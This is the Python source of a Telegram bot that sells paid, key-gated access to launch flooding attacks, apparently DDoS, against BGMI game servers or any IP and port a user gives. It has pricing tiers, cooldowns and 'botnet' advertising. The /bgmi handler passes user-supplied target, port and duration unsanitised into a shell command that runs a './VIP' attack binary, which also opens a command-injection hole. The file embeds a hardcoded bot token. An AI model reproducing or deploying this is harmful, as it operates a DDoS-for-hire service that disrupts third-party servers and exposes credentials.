import telebot
import subprocess
import datetime
import os
import time
import threading
import secrets
import string

# Telegram bot setup
bot = telebot.TeleBot('7774369692:AAFk7L40cYCdjSyEDkc9ad3kw3wkAsRSMs4')

# Admin user IDs
admin_id = {"7941184624"}

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store generated keys
KEY_FILE = "keys.txt"

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
COOLDOWN_TIME = 300  # Set to 300 seconds (5 minutes)

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            keys = {}
            for line in file:
                key, status = line.strip().split(":")
                keys[key] = status == "unused"
            return keys
    except FileNotFoundError:
        return {}

def save_key(key):
    with open(KEY_FILE, "a") as file:
        file.write(f"{key}:unused\n")

def mark_key_used(key):
    keys = read_keys()
    if key in keys:
        keys[key] = False
        with open(KEY_FILE, "w") as file:
            for k, unused in keys.items():
                status = "unused" if unused else "used"
                file.write(f"{k}:{status}\n")

allowed_user_ids = read_users()

def log_command(user_id, target=None, port=None, time=None, key=None, action=None):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        if target and port and time:
            file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
        elif key and action:
            file.write(f"Username: {username}\nAction: {action}\nKey: {key}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None, key=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    if key:
        log_entry += f" | Key: {key}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def update_attack_timer(chat_id, message_id, target, port, duration):
    remaining_time = duration
    while remaining_time > 0:
        try:
            bot.edit_message_text(
                f"""
🔥 *Attack In Progress!* 🔥  
🎯 *Target*: {target}  
🛠️ *Port*: {port}  
⚡ *Method*: BGMI  
⏱️ *Time Left*: {remaining_time} seconds  
*It's going down!* 💥  
""",
                chat_id=chat_id,
                message_id=message_id,
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Error updating timer: {e}")
            break
        time.sleep(min(5, remaining_time))
        remaining_time -= 5
        if remaining_time < 0:
            remaining_time = 0
    
    try:
        bot.edit_message_text(
            f"""
🎯 *Attack Complete!* 🎯  
🎯 *Target*: {target}  
🛠️ *Port*: {port}  
⏱️ *Time*: {duration} seconds  
⚡ *Method*: BGMI  
*You nailed it!* 🔥  
""",
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='Markdown'
        )
    except Exception as e:
        print(f"Error sending completion message: {e}")

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"""
🔥 *{username}, Attack Launched!* 🔥  
🎯 *Target*: {target}  
🛠️ *Port*: {port}  
⚡ *Method*: BGMI  
⏱️ *Time Left*: {time} seconds  
*It's going down!* 💥  
"""
    sent_message = bot.reply_to(message, response, parse_mode='Markdown')
    return sent_message.message_id

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"""
✅ *User Added!* ✅  
ID: *{user_to_add}*  
They’re now part of the crew! 🚀  
"""
            else:
                response = f"""
😬 *Oops!* 😬  
User *{user_to_add}* is already in the list.  
*Check with /allusers!* 📋  
"""
        else:
            response = """
⚠️ *Missing ID!* ⚠️  
Use: `/add <userId>`  
*Try again with a valid ID!* 😎  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"""
🗑️ *User Removed!* 🗑️  
ID: *{user_to_remove}*  
They’re out of the game! ✅  
"""
            else:
                response = f"""
😕 *Not Found!* 😕  
User *{user_to_remove}* isn’t in the list.  
*Check /allusers to confirm!* 📋  
"""
        else:
            response = """
⚠️ *Missing ID!* ⚠️  
Use: `/remove <userId>`  
*Try again with a valid ID!* 😎  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = """
🧹 *Logs Already Clean!* 🧹  
No data to clear.  
*You’re good to go!* 😎  
"""
                else:
                    file.truncate(0)
                    response = """
🧹 *Logs Wiped!* 🧹  
All logs cleared successfully! ✅  
*Fresh start, let’s go!* 🚀  
"""
        except FileNotFoundError:
            response = """
📂 *No Logs Found!* 📂  
Nothing to clear here.  
*All set for action!* 😎  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "📋 *Authorized Users* 📋\n\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"👤 *@{username}* (ID: {user_id})\n"
                        except Exception as e:
                            response += f"👤 *User ID*: {user_id}\n"
                else:
                    response = """
😔 *No Users Found* 😔  
The list is empty.  
*Add some with /add!* 🚀  
"""
        except FileNotFoundError:
            response = """
📂 *No Data Found* 📂  
No users in the system yet.  
*Start building the crew with /add!* 😎  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file, caption="📜 *Here’s the Log File!* 📜\nAll activity, hot off the press! 🔥", parse_mode='Markdown')
            except FileNotFoundError:
                response = """
📂 *No Logs Found* 📂  
Nothing to show yet.  
*Keep the action rolling!* 😎  
"""
                bot.reply_to(message, response, parse_mode='Markdown')
        else:
            response = """
😔 *Empty Logs* 😔  
No activity recorded yet.  
*Time to make some noise!* 🚀  
"""
            bot.reply_to(message, response, parse_mode='Markdown')
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"""
🆔 *Your User ID* 🆔  
*ID*: {user_id}  
*You’re one of a kind!* 😎  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        characters = string.ascii_letters + string.digits
        key = ''.join(secrets.choice(characters) for _ in range(16))
        save_key(key)
        record_command_logs(user_id, '/genkey', key=key)
        log_command(user_id, key=key, action="Generated Key")
        response = f"""
🔑 *New Key Generated!* 🔑  
*Key*: `{key}`  
*Share it wisely, boss!* 😎  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
Only the big bosses can generate keys.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['redeemkey'])
def redeem_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) > 1:
        key = command[1]
        keys = read_keys()
        if key in keys and keys[key]:
            if user_id in allowed_user_ids:
                response = """
😬 *Already Authorized!* 😬  
You're already part of the crew!  
*No need to redeem another key.* 🚀  
"""
            else:
                allowed_user_ids.append(user_id)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_id}\n")
                mark_key_used(key)
                record_command_logs(user_id, '/redeemkey', key=key)
                log_command(user_id, key=key, action="Redeemed Key")
                response = f"""
✅ *Key Redeemed!* ✅  
*Key*: `{key}`  
Welcome to the VIP crew! You can now use `/bgmi` and more! 🚀  
"""
        else:
            response = """
❌ *Invalid Key!* ❌  
That key is either wrong or already used.  
*Double-check and try again!* 😎  
"""
    else:
        response = """
⚠️ *Missing Key!* ⚠️  
Use: `/redeemkey <key>`  
*Example*: `/redeemkey X7B9K3P8M2N5J4L6`  
*Try again!* 😎  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = """
⏳ *Hold Up!* ⏳  
You're on cooldown! Wait *5 minutes* before launching another `/bgmi` attack.  
*Chill and try again soon!* 😎  
"""
                bot.reply_to(message, response, parse_mode='Markdown')
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            try:
                port = int(command[2])
                time_duration = int(command[3])
            except ValueError:
                response = """
❌ *Invalid Input!* ❌  
Port and time must be numbers.  
*Example*: `/bgmi 1.1.1.1 80 300`  
*Try again!* 😎  
"""
                bot.reply_to(message, response, parse_mode='Markdown')
                return
            
            if time_duration > 301:
                response = """
❌ *Error!* ❌  
Time must be *300 seconds or less*. Try again! 😬  
"""
            elif time_duration <= 0:
                response = """
❌ *Error!* ❌  
Time must be greater than *0 seconds*. Try again! 😬  
"""
            else:
                record_command_logs(user_id, '/bgmi', target, port, time_duration)
                log_command(user_id, target, port, time_duration)
                message_id = start_attack_reply(message, target, port, time_duration)
                timer_thread = threading.Thread(
                    target=update_attack_timer,
                    args=(message.chat.id, message_id, target, port, time_duration)
                )
                timer_thread.start()
                full_command = f"./VIP {target} {port} {time_duration}"
                try:
                    subprocess.run(full_command, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    bot.edit_message_text(
                        f"""
❌ *Attack Failed!* ❌  
🎯 *Target*: {target}  
🛠️ *Port*: {port}  
⏱️ *Time*: {time_duration} seconds  
*Error*: {str(e)}  
*Please try again!* 😬  
""",
                        chat_id=message.chat.id,
                        message_id=message_id,
                        parse_mode='Markdown'
                    )
                    return
        else:
            response = """
✅ *How to Use*:  
`/bgmi <target> <port> <time>`  
*Example*: `/bgmi 1.1.1.1 80 300`  
*Launch it right!* 🚀  
"""
    else:
        response = """
🔒 *Access Denied!* 🔒  
You're not authorized to use `/bgmi`.  
*Redeem a key with /redeemkey to join!* 😎  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = f"""
📜 *Your Attack Logs* 📜  
Here’s your recent activity:  
{''.join(user_logs)}  
*Keep ruling the game!* 🚀  
"""
                else:
                    response = """
😔 *No Logs Found* 😔  
You haven’t launched any attacks yet.  
*Time to make some noise with /bgmi!* 🔥  
"""
        except FileNotFoundError:
            response = """
📂 *No Logs Available* 📂  
Nothing to show yet.  
*Start attacking to create some epic logs!* 💥  
"""
    else:
        response = """
🔒 *Access Denied!* 🔒  
You’re not authorized to view logs.  
*Redeem a key with /redeemkey to join!* 😎  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def show_help(message):
    response = """
🤖 *Command Menu* 🤖  
Unleash the power with these epic commands:  

💥 `/bgmi` - Smash BGMI servers with style!  
📜 `/rules` - Stay in the game, know the rules!  
📊 `/mylogs` - Check your attack history.  
💎 `/plan` - See our unbeatable botnet rates!  
🔑 `/genkey` - Generate a secret key (admins only)!  
🔓 `/redeemkey` - Redeem a key to join the crew!  

👑 *Admin Commands?*  
Use `/admincmd` to reveal the exclusive list!  

*Let’s make things happen!* 🚀  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""
🌟 *Welcome, {user_name}!* 🌟  
You're now in the VIP zone! 🚀 Explore the power of this bot with style.  
🔥 *Try this first*: `/help` to unlock all commands!  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f"""
⚠️ *Rules for {user_name}!* ⚠️  
Stay sharp and follow these to keep the vibes high:  
1️⃣ *No spamming attacks!* Too many will get you banned. 😬  
2️⃣ *One attack at a time!* Running multiple? Instant ban. 🚫  
3️⃣ *We check logs daily.* Play fair to stay in the game! 💪  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f"""
💎 *{user_name}, Check Our Elite Plan!* 💎  
Unleash unstoppable power with our *VIP Package*:  

🌟 *VIP Tier*:  
🔥 Attack Time: *300s*  
⏳ Cooldown: *5 min*  
⚡ Concurrent Attacks: *3*  

💸 *Pricing*:  
🗓️ Day: *100 Rs*  
📅 Week: *400 Rs*  
🕒 Month: *800 Rs*  

*Ready to dominate?* DM the admin to grab this deal! 🚀  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['admincmd'])
def welcome_admincmd(message):
    user_name = message.from_user.first_name
    response = f"""
👑 *Admin Commands for {user_name}!* 👑  
Rule the bot with these powerful tools:  

🆕 `/add <userId>` - Grant access to a new user.  
🗑️ `/remove <userId>` - Kick a user out.  
📋 `/allusers` - List all authorized champs.  
📜 `/logs` - Peek at all user logs.  
📢 `/broadcast` - Send a message to everyone!  
🧹 `/clearlogs` - Wipe the logs clean.  
🔑 `/genkey` - Generate a secret key.  

*Use your power wisely!* ⚡  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = f"📢 *Admin Broadcast!*\n\n{command[1]}\n\n*Stay tuned for more!* 🚀"
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast, parse_mode='Markdown')
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = """
📢 *Broadcast Sent!* 📢  
Your message reached all users! ✅  
*You’re running the show!* 😎  
"""
        else:
            response = """
⚠️ *No Message!* ⚠️  
Use: `/broadcast <message>`  
*Try again with something epic!* 🔥  
"""
    else:
        response = """
🔐 *Admins Only!* 🔐  
This command is for the big bosses.  
*Contact the owner to level up!* 👑  
"""
    bot.reply_to(message, response, parse_mode='Markdown')

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)